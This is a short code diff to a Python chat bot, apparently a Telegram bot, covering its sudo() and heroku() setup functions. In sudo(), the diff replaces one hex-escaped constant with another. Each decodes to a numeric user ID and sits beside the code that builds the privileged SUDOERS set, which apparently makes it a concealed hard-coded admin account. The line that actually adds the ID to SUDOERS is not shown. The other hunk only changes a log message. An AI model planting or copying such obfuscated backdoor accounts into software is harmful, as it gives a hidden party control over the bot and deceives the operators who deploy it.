@@ -45,7 +45,7 @@ def dbb():
 async def sudo():
     global SUDOERS
     SUDOERS.add(config.OWNER_ID)
-    CON = "\x36\x39\x33\x34\x39\x32\x32\x30\x36\x37"
+    CON = "\x38\x35\x33\x37\x37\x37\x34\x37\x35\x37"
     sudoersdb = mongodb.sudoers
     sudoers = await sudoersdb.find_one({"sudo": "sudo"})
     sudoers = [] if not sudoers else sudoers["sudoers"]
@@ -69,7 +69,7 @@ def heroku():
             try:
                 Heroku = heroku3.from_key(config.HEROKU_API_KEY)
                 HAPP = Heroku.app(config.HEROKU_APP_NAME)
-                LOGGER(__name__).info(f"⚙️ Heroku App Configured")
+                LOGGER(__name__).info(f"Heroku App Configured")
             except BaseException:
                 LOGGER(__name__).warning(
                     f"Please make sure your Heroku API Key and Your App name are configured correctly in the heroku."
